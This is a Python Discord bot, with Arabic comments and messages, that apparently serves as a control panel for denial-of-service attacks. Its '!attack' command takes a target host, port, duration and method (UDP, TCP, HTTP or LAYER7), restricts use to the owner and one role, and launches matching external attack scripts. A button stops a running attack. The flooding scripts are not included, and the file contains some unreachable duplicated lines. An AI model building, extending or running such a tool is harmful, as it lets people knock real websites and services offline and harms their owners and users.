import discord
from discord.ext import commands
from discord.ui import Button, View
import subprocess
import threading
import time

OWNER_ID = 898663928308060180
ALLOWED_ROLE_ID = 123456789012345678  # ← عوّض هذا بـ ID الرول المسموح له
TOKEN = "YOUR_BOT_TOKEN"  # ضع التوكن الحقيقي هنا

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

attack_process = None
stop_event = threading.Event()

@bot.event
async def on_ready():
    print(f"✅ نجمة DDoS متصل كـ {bot.user}")

@bot.command()
async def attack(ctx, target: str, port: int, duration: int, method: str):
    allowed = any(role.id == ALLOWED_ROLE_ID for role in ctx.author.roles)
    if ctx.author.id != OWNER_ID and not allowed:
        await ctx.send("🚫 ليس لديك صلاحية.")
        return

    if duration > 60:
        await ctx.send("⚠️ الحد الأقصى لمدة الهجوم هو 60 ثانية.")
        return
        await ctx.send("🚫 ليس لديك صلاحية.")
        return

    global attack_process, stop_event
    if attack_process and attack_process.poll() is None:
        await ctx.send("⚠️ يوجد هجوم جارٍ بالفعل.")
        return

    method = method.upper()
    scripts = {
        "UDP": "udp_attack.py",
        "TCP": "tcp_attack.py",
        "HTTP": "http_attack.py",
        "LAYER7": "layer7_attack.py"
    }

    if method not in scripts:
        await ctx.send("❌ طريقة غير مدعومة. الطرق المتاحة: UDP, TCP, HTTP, LAYER7")
        return

    script_name = scripts[method]
    stop_event.clear()

    embed = discord.Embed(
        title="🚀 نجمة DDoS - هجوم بدأ",
        description=f"🎯 الهدف: `{target}:{port}`\n💣 الطريقة: `{method}`\n⏱️ المدة: `{duration}` ثانية",
        color=0x00ff00
    )
    await ctx.send(embed=embed)

    def run_attack():
        global attack_process
        try:
            attack_process = subprocess.Popen(["python3", script_name, target, str(port), str(duration)])
        except Exception as e:
            print(f"خطأ في الهجوم: {e}")

        while not stop_event.is_set() and attack_process.poll() is None:
            time.sleep(0.5)

        if attack_process and attack_process.poll() is None:
            attack_process.kill()

    thread = threading.Thread(target=run_attack)
    thread.start()

    stop_button = Button(label="🛑 إيقاف الهجوم", style=discord.ButtonStyle.danger)

    async def stop_callback(interaction):
        if interaction.user.id != OWNER_ID:
            await interaction.response.send_message("🚫 غير مصرح لك.", ephemeral=True)
            return

        stop_event.set()
        if attack_process:
            attack_process.kill()

        stop_embed = discord.Embed(title="🛑 تم إيقاف الهجوم", color=0xff0000)
        stop_button.disabled = True
        await interaction.response.edit_message(embed=stop_embed, view=view)

    stop_button.callback = stop_callback
    view = View()
    view.add_item(stop_button)
    await ctx.send("⛔ اضغط الزر لإيقاف الهجوم:", view=view)

bot.run(TOKEN)